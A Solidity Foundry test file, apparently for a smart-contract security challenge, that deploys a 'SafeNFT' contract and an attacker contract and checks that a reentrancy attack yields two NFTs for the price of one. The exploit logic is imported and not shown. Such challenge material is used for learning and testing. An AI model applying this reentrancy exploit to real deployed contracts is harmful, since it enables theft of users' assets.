pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import {SafeNFT, SafeNFTHack} from "../../src/safe-nft/safe-nft.sol";

// We need to exploit reentrancy
contract VipBankTest is Test {
    SafeNFT public safeNFT;
    SafeNFTHack public safeNFTHack;

    address hacker;

    function setUp() public {
        safeNFT = new SafeNFT("Safe NFT", "SNFT", 0.1 ether);
        safeNFTHack = new SafeNFTHack(safeNFT);

        hacker = makeAddr("hacker");

        vm.deal(address(hacker), 0.1 ether);
    }

    function testSafeNFT() public {
        assertEq(safeNFT.balanceOf(address(safeNFTHack)), 0);

        vm.startPrank(hacker, hacker);

        // Buy one NFT
        safeNFTHack.buyNFT{value: 0.1 ether}();
        assertTrue(safeNFT.canClaim(address(safeNFTHack)));

        // Initiate hack
        safeNFTHack.hack();

        vm.stopPrank();

        assertEq(safeNFT.balanceOf(address(safeNFTHack)), 2);
    }
}
